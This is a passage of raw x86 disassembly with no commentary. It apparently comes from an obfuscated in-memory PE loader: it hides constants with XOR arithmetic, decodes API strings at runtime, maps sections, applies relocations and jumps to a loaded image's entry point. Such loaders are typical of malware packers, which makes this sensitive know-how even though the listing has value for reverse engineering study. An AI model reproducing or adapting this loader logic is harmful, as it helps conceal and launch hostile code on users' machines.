  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
